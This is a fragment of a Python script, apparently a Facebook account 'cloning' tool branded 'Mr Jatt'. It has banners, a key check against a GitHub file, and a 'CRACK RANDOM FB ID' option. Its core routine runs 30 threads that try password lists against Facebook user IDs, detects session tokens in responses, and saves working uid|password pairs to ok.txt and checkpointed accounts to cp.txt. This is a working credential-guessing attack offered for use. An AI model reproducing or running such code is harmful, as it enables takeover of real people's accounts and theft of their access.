...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Jatt\x1b[0m\x1b[1;97m]
...
def logo2():
 ...
 _   | |`'_\ : | |   | |   
| |__' |// | |,| |,  | |,     Jutt 😘
`.____.'\'-;__/\__/  \__/ Brands 😎
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Jatt\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-Jatt \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Mohsinjutt12345 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/https:/Mohsin Jutt\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Mohsinjutt12345/Jatt.py.git"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/Mohsin Jutt")
...
def notice():
	...
	runtxt("\n\033[0;97m  Free 2023 cloning Tool For Free Aproval Join Group ")
	os.system("xdg-open  https://www.youtube.com/channel/UC7rhwCFzi5149JC8-EskMQw ")
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Mohsinjutt12345/Jatt.py.git/blob/main/run.txt').text
			if basesplit in plr:
				key = basesplit
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-Jatt \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Mohsinjutt12345\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/100071592907773\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		...
		print("───────────────────────────────────────────────────────× ")
		print("───────────────────────────────────────────────────────× ")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2005-20{JUST NOW} %s(Jatt Admin)"%(G,R,G,Y,B))
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("───────────────────────────────────────────────────────× ")
				if len(listpass)<=5:
					exit("\n%s [=>] PASSWORD MINIMUM 8 CHARACTERS"%(R))
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=Jatt=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=Jatt=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=Jatt=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=Jatt=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue

 #Jatt copy krke apna name dal dyna
